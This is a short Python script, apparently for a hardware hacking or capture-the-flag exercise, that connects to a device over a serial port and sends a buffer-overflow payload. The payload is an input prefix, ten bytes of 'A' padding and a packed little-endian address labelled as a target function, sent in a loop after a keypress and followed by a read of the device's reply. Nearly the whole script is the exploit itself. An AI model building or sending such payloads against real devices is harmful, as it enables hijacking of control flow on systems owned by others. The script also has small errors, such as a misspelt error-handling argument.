#!/usr/bin/python3

import serial
import argparse
import struct
import serial
from time import sleep
import codecs

#print(struct.pack("<I", 0xc4be))


parser = argparse.ArgumentParser()
parser.add_argument("device",type=str,help="The USB device to connect to")
parser.add_argument("baud",type=int,help="The baud rate of connecting device")
args = parser.parse_args()

offset = 10 #Change this
new_sp = struct.pack("<I", 0xc4b2c4b2) #target function with little-indienss
payload = b"".join([b"313373" + b"A" * 10,new_sp])
payload += b"\r"

# bs = ser.write(payload)
# print(repr(bs))

ser = serial.Serial(args.device,args.baud,timeout=1)     #Open port with baud rate
print(args.device)
print(args.baud)
print(payload)
#input("Hit enter to send the payload")
#print(f'Sending payload: {payload}')
#ser.write(payload)
#print(ser.readline())


out = b''
# """This Works"""
while True:
    while ser.inWaiting() > 0:
        out += ser.read(1)

    print(out.decode(errors='replace'))


#while True:
#    for line in ser.read():
#        line = ser.readline()
#        print(line)
    sleep(1)
#     ser.write(b'313373\r')
    input("Hit enter to send the payload")
    print(f'Sending payload: {payload}')
    ser.write(payload)
    while ser.inWaiting() > 0:
        out += ser.read(1)
    print(out.decode(errors='repace'))
